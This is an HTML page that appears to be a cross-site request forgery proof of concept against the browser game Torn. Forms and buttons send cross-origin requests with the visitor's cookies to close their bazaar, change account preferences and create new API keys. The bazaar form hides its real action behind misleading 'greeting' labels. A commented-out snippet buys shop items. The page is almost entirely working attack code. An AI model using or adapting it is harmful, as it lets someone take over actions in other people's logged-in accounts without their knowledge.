<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>

<form action="https://www.torn.com/bazaar.php" method="GET">
  <div>
    <label for="sid">What greeting do you want to say?</label>
    <input name="sid" id="sid" value="bazaarData">
  </div>
  <div>
    <label for="step">Who do you want to say it to?</label>
    <input name="step" id="step" value="closeBazaar">
  </div>
  <div>
    <button>Close</button>
  </div>
</form>

<!---https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=Public%20only%20key&type=1-->
<form action="https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=ppp&type=1" method="GET">
  <div>
    <button>Create</button>
  </div>
</form>

<!--
            await getAction({
                type: 'post',
                action: 'shops.php',
                data: {
                    step: 'buyShopItem',
                    ID: 180, //102,
                    amount: 100, //29,
                    //travelShop: 1
                }});
-->

<button onclick="doF()">Fetch</button>

<button onclick="var post_data = 'ajax=step_settings&rfc=&textnames=0&pv=0&reviving=1&widgets=0'; var xmlhttp = new XMLHttpRequest(); xmlhttp.open('POST', 'https://www.torn.com/preferences.php', true); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState === 4) { alert(xmlhttp.response); } }; xmlhttp.send(post_data);">XML</button>

<script>
async function doF() {
const r = await fetch("https://www.torn.com/page.php?sid=apiData", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------272245983515491098933614651682",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
	redirect: 'follow',
    "referrer": "https://www.torn.com/preferences.php",
    "body": "-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"step\"\r\n\r\naddNewKey\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"\"\r\n\r\nundefined\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nPublic%20only%20key\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n-----------------------------272245983515491098933614651682--\r\n",
    "method": "POST",
    "mode": "cors"
});
}
</script>
